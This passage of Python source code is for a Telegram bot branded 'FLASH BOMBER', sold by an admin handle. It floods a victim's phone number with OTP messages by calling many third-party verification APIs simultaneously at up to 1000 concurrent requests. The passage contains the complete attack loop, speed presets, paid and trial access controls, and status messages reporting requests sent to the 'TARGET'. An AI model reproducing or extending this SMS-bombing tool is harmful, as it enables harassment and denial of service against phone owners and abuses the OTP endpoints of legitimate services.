            return
        if duration > 1000000000000:
            await update.message.reply_text("❌ Bsdk aur kitne karega")
            return
    except ValueError:
        await update.message.reply_text("❌ Invalid duration! Must be a number (10-300).")
        return
    
    # Check if APIs are configured
    if TOTAL_APIS == 0:
        await update.message.reply_text(
            """
╔═══════════════════════╗
║  ⚡ NO APIs CONFIGURED  ║
╚═══════════════════════╝

APIs are not configured yet.

Contact admin for support: @VIP_X_OFFICIAL
"""
        )
        return
    
    # Get user speed settings (force level 5 for flash attack)
    flash_settings = {
        'speed_level': 5,
        'max_concurrent': SPEED_PRESETS[5]['max_concurrent'],
        'delay': SPEED_PRESETS[5]['delay']
    }
    await set_user_speed_settings(user_id, flash_settings)
    
    # Calculate end time
    current_time = datetime.now()
    end_time = current_time + timedelta(seconds=duration)
    
    # Initialize flash attack session
    context.user_data['attacking'] = True
    context.user_data['target_phone'] = phone
    context.user_data['attack_duration'] = duration
    context.user_data['attack_start'] = current_time
    context.user_data['attack_end'] = end_time
    context.user_data['total_requests'] = 0
    context.user_data['successful_requests'] = 0
    context.user_data['failed_requests'] = 0
    context.user_data['speed_settings'] = flash_settings
    context.user_data['is_trial_attack'] = False
    
    # Create initial flash attack message
    status_message = f"""
╔════════════════════════════════════════╗
║      ⚡💥 FLASH ATTACK STARTED     ║
╚════════════════════════════════════════╝

🎯 TARGET: {phone}
⏱️ DURATION: {duration} seconds
⚡ MODE: FLASH ATTACK (PAID USER)
📅 STARTED: {current_time.strftime('%H:%M:%S')}

👤 USER STATUS:
├─ Account Type: ✅ PAID USER
├─ Trial Status: ❌ BLOCKED (One-time used)
├─ Access: Unlimited attacks
└─ Admin: @VIP_X_OFFICIAL

⚡ FLASH CONFIGURATION:
├─ Speed: FLASH MODE (Level 5)
├─ Strategy: All APIs fire simultaneously
├─ Concurrency: 1000 parallel requests
├─ Total APIs: {TOTAL_APIS}
└─ Max OTPs/sec: {TOTAL_APIS * 10}

📡 ATTACK STATUS:
├─ Status: FIRING ALL APIs
├─ Mode: Maximum Destruction
└─ Will stop: After {duration}s

📊 INITIAL STATS:
├─ Requests: 0
├─ Success: 0
├─ Failed: 0
└─ RPS: 0.0
"""
    
    start_msg = await update.message.reply_text(status_message)
    
    context.user_data['status_message_id'] = start_msg.message_id
    context.user_data['status_chat_id'] = update.effective_chat.id
    context.user_data['last_rps_update'] = time.time()
    context.user_data['requests_since_last_update'] = 0
    context.user_data['last_status_update'] = time.time()
    
    # Start FLASH ATTACK task
    asyncio.create_task(run_flash_attack(update, context, phone, duration, flash_settings, is_trial=False))

# =============== FLASH ATTACK FUNCTIONS ===============

async def flash_api_call(session: aiohttp.ClientSession, api: dict, phone: str, context: ContextTypes.DEFAULT_TYPE):
    """Call a single API for flash attack"""
    try:
        url = api['url'].format(phone=phone)
        data = api['data'](phone) if callable(api['data']) else api['data']
        
        start_time = time.time()
        
        if api['method'] == 'GET':
            async with session.get(url, headers=api.get('headers', {}), timeout=aiohttp.ClientTimeout(3)) as response:
                end_time = time.time()
                response_time = end_time - start_time
                success = response.status in [200, 201, 202, 204]
                return {
                    'api_name': api.get('name', 'Unknown'),
                    'success': success,
                    'status': response.status,
                    'response_time': response_time,
                    'error': None
                }
        elif api['method'] == 'POST':
            async with session.post(url, headers=api.get('headers', {}), data=data, timeout=aiohttp.ClientTimeout(3)) as response:
                end_time = time.time()
                response_time = end_time - start_time
                success = response.status in [200, 201, 202, 204]
                return {
                    'api_name': api.get('name', 'Unknown'),
                    'success': success,
                    'status': response.status,
                    'response_time': response_time,
                    'error': None
                }
    except asyncio.TimeoutError:
        return {
            'api_name': api.get('name', 'Unknown'),
            'success': False,
            'status': 0,
            'response_time': 3.0,
            'error': 'Timeout'
        }
    except Exception as e:
        return {
            'api_name': api.get('name', 'Unknown'),
            'success': False,
            'status': 0,
            'response_time': 0,
            'error': str(e)
        }

async def run_flash_attack(update: Update, context: ContextTypes.DEFAULT_TYPE, phone: str, duration: int, speed_settings: dict, is_trial: bool = False):
    """Run FLASH ATTACK - All APIs at once with maximum speed"""
    chat_id = context.user_data.get('status_chat_id')
    message_id = context.user_data.get('status_message_id')
    attack_start = context.user_data.get('attack_start')
    
    # For flash attack, use maximum concurrency
    max_concurrent = 100
    connector = aiohttp.TCPConnector(limit=max_concurrent, limit_per_host=max_concurrent)
    timeout = aiohttp.ClientTimeout(total=5)
    
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        end_timestamp = time.time() + duration
        
        # FLASH ATTACK LOOP
        while time.time() < end_timestamp and context.user_data.get('attacking', False):
            # Calculate remaining time
            remaining = end_timestamp - time.time()
            if remaining <= 0:
                break
            
            # Create tasks for ALL APIs at once
            tasks = []
            for api in APIS:
                if not context.user_data.get('attacking', False):
                    break
                
                # Call each API multiple times based on count
                for i in range(api.get('count', 1)):
                    if not context.user_data.get('attacking', False) or time.time() >= end_timestamp:
                        break
                    
                    task = asyncio.create_task(flash_api_call(session, api, phone, context))
                    tasks.append(task)
            
            # Execute ALL tasks concurrently - FLASH ATTACK!
            if tasks:
                try:
                    # Wait for all tasks with timeout
                    results = await asyncio.gather(*tasks, return_exceptions=True)
                    
                    # Process results
                    for result in results:
                        if isinstance(result, dict):
                            # Update counters
                            if context.user_data.get('attacking', False):
                                context.user_data['total_requests'] = context.user_data.get('total_requests', 0) + 1
                                if result['success']:
                                    context.user_data['successful_requests'] = context.user_data.get('successful_requests', 0) + 1
                                else:
                                    context.user_data['failed_requests'] = context.user_data.get('failed_requests', 0) + 1
                                context.user_data['requests_since_last_update'] = context.user_data.get('requests_since_last_update', 0) + 1
                
                except Exception as e:
                    logger.debug(f"Flash batch error: {e}")
            
            # Update RPS every 0.5 seconds for flash attack
            current_time = time.time()
            if current_time - context.user_data.get('last_rps_update', 0) >= 0.5:
                elapsed = current_time - context.user_data['last_rps_update']
                requests = context.user_data.get('requests_since_last_update', 0)
                rps = requests / elapsed if elapsed > 0 else 0
                context.user_data['last_rps'] = rps
                context.user_data['last_rps_update'] = current_time
                context.user_data['requests_since_last_update'] = 0
            
            # Update status every 1 second for flash attack
            if current_time - context.user_data.get('last_status_update', 0) >= 1:
                await update_flash_status(context, chat_id, message_id, phone, duration, is_trial)
                context.user_data['last_status_update'] = current_time
            
            # Minimal delay for flash attack
            if time.time() < end_timestamp:
                sleep_time = min(0.01, end_timestamp - time.time())
                if sleep_time > 0:
                    await asyncio.sleep(sleep_time)
    
    # Attack finished
    attack_end = datetime.now()
    elapsed = (attack_end - attack_start).seconds
    
    # Update final status
    await update_flash_final_status(context, chat_id, message_id, phone, elapsed, speed_settings, is_trial)
    
    # Log attack
    await log_attack(
        user_id=update.effective_user.id,
        target_number=phone,
        duration=elapsed,
        requests_sent=context.user_data.get('total_requests', 0),
        success=context.user_data.get('successful_requests', 0),
        failed=context.user_data.get('failed_requests', 0),
        start_time=attack_start,
        end_time=attack_end,
        status="COMPLETED" if context.user_data.get('attacking', False) else "STOPPED",
        is_trial_attack=is_trial
    )
    
    # Clear attack flag
    context.user_data['attacking'] = False

async def update_flash_status(context: ContextTypes.DEFAULT_TYPE, chat_id: int, message_id: int, phone: str, duration: int, is_trial: bool = False):
    """Update flash attack status message"""
    if not context.user_data.get('attacking', False):
        return
    
    try:
        current_time = time.time()
        attack_start_time = context.user_data['attack_start'].timestamp()
        elapsed = int(current_time - attack_start_time)
        remaining = max(0, duration - elapsed)
        
        # Calculate progress
        progress_percent = min(100, int((elapsed / duration) * 100))
        progress_bar_length = 20
        filled = int(progress_percent / 100 * progress_bar_length)
        progress_bar = "█" * filled + "░" * (progress_bar_length - filled)
        
        # Get current RPS
        current_rps = context.user_data.get('last_rps', 0.0)
        
        status_message = f"""
╔════════════════════════════════════════╗
║        ⚡💥 FLASH ATTACK ACTIVE       ║
╚════════════════════════════════════════╝

🎯 TARGET: {phone}
⏱️ TIME: {elapsed}s / {duration}s
📊 PROGRESS: {progress_bar} {progress_percent}%
⏳ REMAINING: {remaining}s

⚡ FLASH STATS:
├─ REQUESTS: {context.user_data.get('total_requests', 0)}
├─ SUCCESS: {context.user_data.get('successful_requests', 0)}
├─ FAILED: {context.user_data.get('failed_requests', 0)}
├─ RPS: {current_rps:.1f}
└─ APIS: {TOTAL_APIS}

📡 STATUS: ALL APIs FIRING SIMULTANEOUSLY
🕐 LAST UPDATE: {datetime.now().strftime('%H:%M:%S')}
"""
        
        await context.bot.edit_message_text(
            chat_id=chat_id,
            message_id=message_id,
            text=status_message
        )
    except Exception as e:
        logger.error(f"Failed to update flash status: {e}")

async def update_flash_final_status(context: ContextTypes.DEFAULT_TYPE, chat_id: int, message_id: int, phone: str, elapsed: int, speed_settings: dict, is_trial: bool = False):
    """Update final flash attack status"""
    try:
        status = "✅ FLASH COMPLETED" if context.user_data.get('attacking', False) else "🛑 FLASH STOPPED"
        
        # Calculate success rate
        total = context.user_data.get('total_requests', 0)
        success = context.user_data.get('successful_requests', 0)
        success_rate = (success / total * 100) if total > 0 else 0
        
        # Calculate average RPS
        avg_rps = total / elapsed if elapsed > 0 else 0
        
        # Calculate OTPs per second
        otps_per_second = avg_rps / TOTAL_APIS if TOTAL_APIS > 0 else 0
        
        final_message = f"""
╔════════════════════════════════════════╗
║        ⚡💥 FLASH ATTACK RESULTS      ║
╚════════════════════════════════════════╝

🎯 TARGET: {phone}
⏱️ DURATION: {elapsed} seconds
📊 STATUS: {status}

📈 FLASH PERFORMANCE:
├─ TOTAL REQUESTS: {total}
├─ SUCCESSFUL: {success}
├─ FAILED: {context.user_data.get('failed_requests', 0)}
├─ SUCCESS RATE: {success_rate:.1f}%
├─ AVG RPS: {avg_rps:.1f}
├─ OTPS/SEC: {otps_per_second:.1f}
└─ TOTAL APIS: {TOTAL_APIS}

⚡ ATTACK SUMMARY:
├─ Mode: FLASH ATTACK (Maximum Speed)
├─ Strategy: All APIs firing simultaneously
├─ Concurrency: 100+ parallel requests
└─ Speed: Ultra High
"""
        
        if is_trial:
            final_message += f"""
⚠️ TRIAL STATUS:
├─ ❌ Your free trial is now PERMANENTLY USED
├─ 🔒 Trial access is NOW BLOCKED
├─ ⚠️ You cannot use trial again
├─ 💰 Contact admin for paid access
└─ 👑 @VIP_X_OFFICIAL
"""
        else:
            final_message += f"""
💡 NEXT ACTIONS:
├─ ⚡ Use /attack for new flash attack
├─ 🚀 Use /speed 5 for flash mode
└─ 📊 Use /stats for full statistics
"""
        
        final_message += f"""
🕐 TIME INFO:
├─ STARTED: {context.user_data['attack_start'].strftime('%H:%M:%S')}
└─ ENDED: {datetime.now().strftime('%H:%M:%S')}
"""
        
        await context.bot.edit_message_text(
            chat_id=chat_id,
            message_id=message_id,
            text=final_message
        )
    except Exception as e:
        logger.error(f"Failed to update flash final status: {e}")

async def stop_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Stop current flash attack immediately"""
    user_id = update.effective_user.id
    
    if not context.user_data.get('attacking', False):
        await update.message.reply_text(
            "ℹ️ No active attack to stop.\n"
            "Use /trial for free trial or /attack for paid attack."
        )
        return
    
    # Get attack details before stopping
    target_phone = context.user_data.get('target_phone', 'Unknown')
    total_requests = context.user_data.get('total_requests', 0)
    successful_requests = context.user_data.get('successful_requests', 0)
    failed_requests = context.user_data.get('failed_requests', 0)
    attack_start = context.user_data.get('attack_start', datetime.now())
    is_trial = context.user_data.get('is_trial_attack', False)
    
    # Calculate elapsed time
    elapsed = (datetime.now() - attack_start).seconds
    
    # IMMEDIATELY stop the attack
    context.user_data['attacking'] = False
    
    # Calculate statistics
    success_rate = (successful_requests / total_requests * 100) if total_requests > 0 else 0
    avg_rps = total_requests / elapsed if elapsed > 0 else 0
    
    # Send immediate stop confirmation
    stop_message = f"""
╔════════════════════════════════════════╗
║      ⚡💥 FLASH ATTACK STOPPED     ║
╚════════════════════════════════════════╝

🎯 TARGET: {target_phone}
⏱️ DURATION: {elapsed} seconds
📊 STATUS: STOPPED MANUALLY

📈 FLASH STATS:
├─ TOTAL REQUESTS: {total_requests}
├─ SUCCESSFUL: {successful_requests}
├─ FAILED: {failed_requests}
├─ SUCCESS RATE: {success_rate:.1f}%
├─ AVG RPS: {avg_rps:.1f}
└─ TOTAL APIS: {TOTAL_APIS}

✅ Flash attack has been completely stopped.
⚡ No further OTPs will be sent.
"""
    
    if is_trial:
        # Get trial info
        trial_info = await get_user_trial_info(user_id)
        
        stop_message += f"""
⚠️ TRIAL STATUS:
├─ ❌ Your ONE-TIME trial is now USED
├─ 🔒 Trial access is PERMANENTLY BLOCKED
├─ ⚠️ Cannot use trial again
├─ 💰 Contact admin for paid access
└─ 👑 @VIP_X_OFFICIAL
"""
    else:
        stop_message += f"""
💡 NEXT ACTIONS:
├─ ⚡ Use /attack for new flash attack
├─ 🚀 Use /speed 5 for flash mode
└─ 📊 Use /stats for full statistics
"""
    
    await update.message.reply_text(stop_message)
    
    # Also update the status message if it exists
    try:
        chat_id = context.user_data.get('status_chat_id')
        message_id = context.user_data.get('status_message_id')
        
        if chat_id and message_id:
            await context.bot.edit_message_text(
                chat_id=chat_id,
                message_id=message_id,
                text=stop_message
            )
    except Exception as e:
        logger.debug(f"Could not update status message: {e}")
    
    # Clear attack data
    attack_keys = [
        'target_phone', 'attack_duration', 'attack_start', 'attack_end',
        'total_requests', 'successful_requests', 'failed_requests',
        'status_message_id', 'status_chat_id', 'last_rps_update',
        'requests_since_last_update', 'last_rps', 'speed_settings',
        'last_status_update', 'is_trial_attack'
    ]
    
    for key in attack_keys:
        context.user_data.pop(key, None)

async def speed_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle speed control command - Paid users only"""
    user_id = update.effective_user.id
    
    # Check if user is authorized (paid user)
    if not await is_user_authorized(user_id):
        trial_info = await get_user_trial_info(user_id)
        
        await update.message.reply_text(
            f"""
╔═══════════════════════╗
║    🔒 PAID FEATURE    ║
╚═══════════════════════╝

Speed control is available for PAID USERS only.

🎁 Your Trial Status:
├─ Trials Used: {trial_info['trial_used_count']}
├─ Trial Blocked: {"✅ PERMANENTLY" if trial_info['is_trial_blocked'] else "❌ No"}
├─ Paid User: ❌ No

⚡ Trial Users Speed:
Speed is fixed at Level 5 (FLASH MODE) for trial.

💰 Contact Admin for Full Access:
@VIP_X_OFFICIAL
"""
        )
        return
    
    current_settings = await get_user_speed_settings(user_id)
    current_level = current_settings['speed_level']
    
    if not context.args:
        # Show current speed settings
        preset = SPEED_PRESETS[current_level]
        
        message = f"""
╔═══════════════════════╗
║     ⚡ SPEED LEVELS    ║
╚═══════════════════════╝

📊 Current Settings:
├─ Name: {preset['name']}
├─ Level: {current_level}
├─ Concurrent: {current_settings['max_concurrent']}
├─ Delay: {current_settings['delay']}s
└─ Description: {preset['description']}

🎯 Available Levels:
├─ 1️⃣ Level 1: 🐢 Very Slow
│   ├─ Concurrent: 30
│   └─ Delay: 0.5s
├─ 2️⃣ Level 2: 🚶 Slow
│   ├─ Concurrent: 50
│   └─ Delay: 0.3s
├─ 3️⃣ Level 3: ⚡ Medium
│   ├─ Concurrent: 100
│   └─ Delay: 0.1s
├─ 4️⃣ Level 4: 🚀 Fast
│   ├─ Concurrent: 200
│   └─ Delay: 0.05s
└─ 5️⃣ Level 5: ⚡💥 FLASH MODE
    ├─ Concurrent: 1000
    └─ Delay: 0.001s

💡 Usage: /speed <level>
📌 Example: /speed 5 for FLASH ATTACK
"""
        
        await update.message.reply_text(message)
        return
    
    # Set new speed level
    try:
        new_level = int(context.args[0])
        
        if new_level not in SPEED_PRESETS:
            await update.message.reply_text(
                """
╔═══════════════════════╗
║    ❌ INVALID LEVEL    ║
╚═══════════════════════╝

Please use level 1-5:
1️⃣ 🐢 Very Slow
2️⃣ 🚶 Slow
3️⃣ ⚡ Medium
4️⃣ 🚀 Fast
5️⃣ ⚡💥 FLASH MODE
"""
            )
            return
        
        # Apply preset
        preset = SPEED_PRESETS[new_level]
        new_settings = {
            'speed_level': new_level,
            'max_concurrent': preset['max_concurrent'],
            'delay': preset['delay']
        }
        
        await set_user_speed_settings(user_id, new_settings)
        
        await update.message.reply_text(
            f"""
╔═══════════════════════╗
║     ✅ SPEED UPDATED   ║
╚═══════════════════════╝

📊 New Settings Applied:
├─ Name: {preset['name']}
├─ Level: {new_level}
├─ Concurrent: {preset['max_concurrent']}
├─ Delay: {preset['delay']}s
└─ Description: {preset['description']}

⚡ Next attack will use these settings.
"""
        )
        
    except ValueError:
        await update.message.reply_text(
            "❌ Invalid input!\n"
            "Use /speed to see settings or /speed 1-5 to change."
        )

async def add_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Add paid user (Admin only)"""
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text(
            """
╔═══════════════════════╗
║  ❌ PERMISSION DENIED  ║
╚═══════════════════════╝

Only admins can use this command.
"""
        )
        return
    
    if not context.args or len(context.args) < 1:
        await update.message.reply_text(
            "Usage: /add <user_id> [username]\n"
            "Example: /add 1234567890 Username"
        )
        return
    
    try:
        target_id = int(context.args[0])
        username = context.args[1] if len(context.args) > 1 else "Unknown"
        
        # Clean the username
        clean_username = clean_text(username)
        
        # Add as paid user with trial blocked
        await add_authorized_user(target_id, clean_username, f"User {target_id}", user_id, True)
        
        await update.message.reply_text(
            f"""
╔═══════════════════════╗
║     ✅ USER ADDED     ║
╚═══════════════════════╝

👤 User Details:
├─ ID: {target_id}
├─ Username: {clean_username}
├─ Status: ✅ PAID USER
├─ Trial: ❌ PERMANENTLY BLOCKED
├─ Added by: {user_id}
└─ Time: {datetime.now().strftime('%H:%M:%S')}

✅ User can now use FLASH ATTACK with /attack
❌ Trial access is PERMANENTLY blocked
💰 User has full paid access
"""
        )
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID. Must be a number.")

async def remove_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Remove user (Admin only)"""
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text(
            """
╔═══════════════════════╗
║  ❌ PERMISSION DENIED  ║
╚═══════════════════════╝

Only admins can use this command.
"""
        )
        return
    
    if not context.args or len(context.args) < 1:
        await update.message.reply_text(
            "Usage: /remove <user_id>\n"
            "Example: /remove 1234567890"
        )
        return
    
    try:
        target_id = int(context.args[0])
        
        await remove_authorized_user(target_id)
        
        await update.message.reply_text(
            f"""
╔═══════════════════════╗
║     ✅ USER REMOVED   ║
╚═══════════════════════╝

👤 User Details:
├─ ID: {target_id}
├─ Removed by: {user_id}
└─ Time: {datetime.now().strftime('%H:%M:%S')}

❌ User can no longer use FLASH ATTACK.
❌ Both trial and paid access removed.
❌ User needs to be re-added for access.
"""
        )
        
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID. Must be a number.")

async def reset_trial(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Reset user's trial (Admin only)"""
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text(
            """
╔═══════════════════════╗
║  ❌ PERMISSION DENIED  ║
╚═══════════════════════╝

Only admins can use this command.
"""
        )
        return
    
    if not context.args or len(context.args) < 1:
        await update.message.reply_text(
            "Usage: /resettrial <user_id>\n"
            "Example: /resettrial 1234567890"
        )
        return
    
    try:
        target_id = int(context.args[0])
        
        # Reset trial for user
        await reset_user_trial(target_id)
        
        await update.message.reply_text(
            f"""
╔═══════════════════════╗
║   ✅ TRIAL RESET      ║
╚═══════════════════════╝

👤 User Details:
├─ ID: {target_id}
├─ Action: Trial Reset
├─ By Admin: {user_id}
└─ Time: {datetime.now().strftime('%H:%M:%S')}

✅ User's trial has been reset.
✅ Trial counter set to 0.
✅ Trial access UNBLOCKED.
✅ Can use /trial again (ONE TIME ONLY).
"""
        )
        
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID. Must be a number.")

async def block_trial(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Block user's trial (Admin only)"""
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text(
            """
╔═══════════════════════╗
║  ❌ PERMISSION DENIED  ║
╚═══════════════════════╝

Only admins can use this command.
"""
        )
        return
    
    if not context.args or len(context.args) < 1:
        await update.message.reply_text(
            "Usage: /blocktrial <user_id>\n"
            "Example: /blocktrial 1234567890"
        )
        return
    
    try:
        target_id = int(context.args[0])
        
        # Block trial for user
        await block_user_trial(target_id)
        
        await update.message.reply_text(
            f"""
╔═══════════════════════╗
║   ✅ TRIAL BLOCKED    ║
╚═══════════════════════╝

👤 User Details:
├─ ID: {target_id}
├─ Action: Trial Blocked
├─ By Admin: {user_id}
└─ Time: {datetime.now().strftime('%H:%M:%S')}

❌ User's trial has been PERMANENTLY BLOCKED.
❌ Cannot use /trial command.
💰 Contact admin for paid access only.
"""
        )
        
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID. Must be a number.")

async def unblock_trial(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Unblock user's trial (Admin only)"""
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text(
            """
╔═══════════════════════╗
║  ❌ PERMISSION DENIED  ║
╚═══════════════════════╝

Only admins can use this command.
"""
        )
        return
    
    if not context.args or len(context.args) < 1:
        await update.message.reply_text(
            "Usage: /unblocktrial <user_id>\n"
            "Example: /unblocktrial 1234567890"
        )
        return
    
    try:
        target_id = int(context.args[0])
        
        # Unblock trial for user
        await unblock_user_trial(target_id)
        
        await update.message.reply_text(
            f"""
╔═══════════════════════╗
║   ✅ TRIAL UNBLOCKED  ║
╚═══════════════════════╝

👤 User Details:
├─ ID: {target_id}
├─ Action: Trial Unblocked
├─ By Admin: {user_id}
└─ Time: {datetime.now().strftime('%H:%M:%S')}

✅ User's trial has been UNBLOCKED.
✅ Can use /trial command again.
⏰ ONE-TIME USE ONLY.
"""
        )
        
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID. Must be a number.")

async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """List all authorized users (Admin only)"""
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text(
            """
╔═══════════════════════╗
║  ❌ PERMISSION DENIED  ║
╚═══════════════════════╝

Only admins can use this command.
"""
        )
        return
    
    users = await get_all_authorized_users()
    
    if not users:
        await update.message.reply_text("📭 No authorized users found.")
        return
    
    message = "╔════════════════════════════════════════╗\n"
    message += "║          📋 AUTHORIZED USERS          ║\n"
    message += "╚════════════════════════════════════════╝\n\n"
    
    for idx, (user_id, username, display_name, added_at, trial_count, last_trial, trial_blocked, is_paid) in enumerate(users, 1):
        status = "💰 PAID USER" if is_paid else "🎁 TRIAL USER"
        trial_status = "✅ ACTIVE" if not trial_blocked else "❌ PERMANENTLY BLOCKED"
        
        message += f"┌─👤 USER #{idx}\n"
        message += f"│\n"
        message += f"├─ ID: {user_id}\n"
        message += f"├─ Username: {username or 'N/A'}\n"
        message += f"├─ Display Name: {display_name or 'N/A'}\n"
        message += f"├─ Status: {status}\n"
        message += f"├─ Trials Used: {trial_count}\n"
        message += f"├─ Last Trial: {last_trial.split('T')[0] if last_trial else 'Never'}\n"
        message += f"├─ Trial Status: {trial_status}\n"
        message += f"└─ Added: {added_at}\n\n"
    
    message += f"📊 Total Users: {len(users)}"
    
    await update.message.reply_text(message)

async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show user statistics"""
    user_id = update.effective_user.id
    
    # Get user's clean name
    user_first_name = update.effective_user.first_name or "User"
    clean_first_name = clean_text(user_first_name)
    
    trial_info = await get_user_trial_info(user_id)
    
    # If user doesn't exist, add them
    if not trial_info['exists']:
        username = update.effective_user.username or "Not set"
        await add_authorized_user(user_id, username, clean_first_name, 0, False)
        trial_info = await get_user_trial_info(user_id)
    
    # Check trial availability
    trial_allowed, reason = await can_user_use_trial(user_id)
    
    status = "🎁 Trial Available" if trial_allowed else "💰 Paid User" if trial_info['is_paid_user'] else "🔒 Trial Used & Blocked"
    
    stats_text = f"""
╔════════════════════════════════════════╗
║          📊 FLASH STATISTICS         ║
╚════════════════════════════════════════╝

👤 USER INFORMATION
├─ ID: {user_id}
├─ Name: {clean_first_name}
├─ Username: @{update.effective_user.username or "Not set"}

🎁 TRIAL INFORMATION
├─ Trials Used: {trial_info['trial_used_count']}
├─ Last Trial: {trial_info['last_trial_used'].split('T')[0] if trial_info['last_trial_used'] else 'Never'}
├─ Trial Blocked: {"✅ PERMANENTLY" if trial_info['is_trial_blocked'] else "❌ No"}
├─ Trial Available: {"✅ Yes" if trial_allowed else "❌ No"}
└─ Reason: {reason}

⚡ FLASH ATTACK INFO
├─ Total APIs: {TOTAL_APIS}
├─ Max Speed: Level 5 (FLASH MODE)
├─ Max Concurrency: 1000
└─ Max OTPs/sec: {TOTAL_APIS * 10 if TOTAL_APIS > 0 else 0}

💰 ACCOUNT STATUS
├─ Status: {status}
"""
    
    if trial_allowed:
        stats_text += """
├─ ✅ Trial Available (ONE TIME ONLY)
├─ ⏰ Duration: 60 seconds
├─ 🔒 After trial: PERMANENTLY BLOCKED
├─ ⚠️ Cannot use trial again
└─ 💰 Contact admin for paid access
"""
    elif trial_info['is_paid_user']:
        stats_text += """
├─ ✅ Paid User
├─ ⚡ Unlimited attacks
├─ 🚀 All speed levels
├─ ⏰ Max duration: No limit
└─ 👑 Thank you for purchasing!
"""
    else:
        stats_text += """
├─ ❌ Trial Used
├─ 🔒 Trial PERMANENTLY blocked
├─ ⚠️ One-time trial already used
├─ 💰 Contact admin for paid access
└─ 👑 Admin: @VIP_X_OFFICIAL
"""
    
    await update.message.reply_text(stats_text)

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show help menu"""
    user_id = update.effective_user.id
    trial_info = await get_user_trial_info(user_id)
    trial_allowed, _ = await can_user_use_trial(user_id)
    
    status = "🎁 Trial Available" if trial_allowed else "💰 Paid User" if trial_info['is_paid_user'] else "🔒 Trial Used & Blocked"
    
    help_text = f"""
╔════════════════════════════════════════╗
║        ⚡💥 FLASH BOMBER HELP        ║
╚════════════════════════════════════════╝

👤 YOUR STATUS: {status}

⚡ FLASH ATTACK COMMANDS:
├─ /trial <number> - One-time free trial (60s)
├─ /mytrial - Check your trial status
├─ /attack <num> <time> - Paid flash attack
├─ /speed <1-5> - Set speed (5=Flash Mode) - PAID ONLY
├─ /stop - Stop current attack
├─ /stats - View statistics
└─ /help - Show this menu

🎯 FLASH ATTACK FEATURES:
├─ Speed Level 5: FLASH MODE
├─ Strategy: All APIs fire simultaneously
├─ Concurrency: 1000 parallel requests
├─ Total APIs: {TOTAL_APIS}
└─ Max OTPs: Unlimited during attack

⚠️ TRIAL RULES (STRICT - ONE TIME ONLY):
├─ ✅ Available: ONE TIME ONLY
├─ ⏰ Duration: 60 seconds
├─ ❌ After trial: PERMANENTLY BLOCKED
├─ 🔒 No further trial access
├─ 💰 Only paid access after trial
└─ 👑 Admin: @VIP_X_OFFICIAL
"""
    
    if is_admin(user_id):
        help_text += """
👑 ADMIN COMMANDS:
├─ /add <user_id> - Add paid user
├─ /remove <user_id> - Remove user
├─ /users - List all users
├─ /resettrial <user_id> - Reset user trial
├─ /blocktrial <user_id> - Permanently block trial
├─ /unblocktrial <user_id> - Unblock user trial
└─ /broadcast <msg> - Broadcast message
"""
    
    await update.message.reply_text(help_text)

async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Broadcast message to all users (Admin only)"""
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text(
            """
╔═══════════════════════╗
║  ❌ PERMISSION DENIED  ║
╚═══════════════════════╝

Only admins can use this command.
"""
        )
        return
    
    if not context.args:
        await update.message.reply_text(
            "Usage: /broadcast <message>\n"
            "Example: /broadcast Hello everyone!"
        )
        return
    
    message = ' '.join(context.args)
    users = await get_all_authorized_users()
    
    if not users:
        await update.message.reply_text("📭 No users to broadcast to.")
        return
    
    sent = 0
    failed = 0
    
    broadcast_msg = await update.message.reply_text(
        f"📢 Broadcasting to {len(users)} users...\n"
        f"✅ Sent: 0 | ❌ Failed: 0"
    )
    
    for user_id, username, _, _, _, _, _, _ in users:
        try:
            await context.bot.send_message(
                chat_id=user_id,
                text=f"""
╔════════════════════════════════════════╗
║          📢 BROADCAST MESSAGE          ║
╚════════════════════════════════════════╝

{message}

📅 Date: {datetime.now().strftime('%d %b %Y')}
🕐 Time: {datetime.now().strftime('%H:%M:%S')}

👑 Sent by Admin
"""
            )
            sent += 1
        except Exception as e:
            failed += 1
            logger.error(f"Failed to send to {user_id}: {e}")
        
        # Update status every 5 sends
        if (sent + failed) % 5 == 0:
            try:
                await broadcast_msg.edit_text(
                    f"📢 Broadcasting to {len(users)} users...\n"
                    f"✅ Sent: {sent} | ❌ Failed: {failed}"
                )
            except:
                pass
        
        # Small delay to avoid rate limiting
        await asyncio.sleep(0.1)
    
    await broadcast_msg.edit_text(
        f"""
╔════════════════════════════════════════╗
║          ✅ BROADCAST COMPLETE         ║
╚════════════════════════════════════════╝

📊 Broadcast Results:
├─ Total Users: {len(users)}
├─ Successfully Sent: {sent}
└─ Failed: {failed}

📅 Date: {datetime.now().strftime('%d %b %Y')}
🕐 Time: {datetime.now().strftime('%H:%M:%S')}
"""
    )

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Log errors"""
    logger.error(f"Update {update} caused error {context.error}")

async def post_init(application: Application):
    """Initialize MongoDB connection after bot starts"""
    await mongo.connect()

async def shutdown(application: Application):
    """Clean up MongoDB connection on shutdown"""
    await mongo.close()

def main():
    """Start the bot."""
    application = Application.builder().token(BOT_TOKEN).post_init(post_init).build()
    
    # Add command handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("trial", trial))
    application.add_handler(CommandHandler("mytrial", mytrial))
